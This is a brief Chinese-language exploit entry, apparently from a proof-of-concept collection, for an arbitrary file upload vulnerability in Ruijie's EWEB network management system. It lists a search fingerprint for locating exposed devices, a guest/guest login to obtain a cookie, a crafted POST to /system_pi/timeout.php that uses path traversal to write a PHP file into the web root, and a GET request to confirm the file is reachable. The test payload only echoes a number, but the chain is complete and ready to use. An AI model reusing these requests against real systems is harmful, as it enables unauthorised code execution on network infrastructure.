# 锐捷uploadAction存在任意文件文件上传漏洞

- **系统**：锐捷　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=”锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`

**请求体 / payload**
```
获取cookie
Host:
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
username=guest&password=guest?
构造上传
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host:
Content-Length: 62
Content-Type: application/x-www-form-urlencoded
Cookie:填入步骤一获取的cookie
X-Requested-With: XMLHttpRequest
fileName=../tmp/html/test.php&mes=<?php echo 123321;?>
文件定位：
GET /test.php HTTP/1.1
```
- **预期**：200　|　—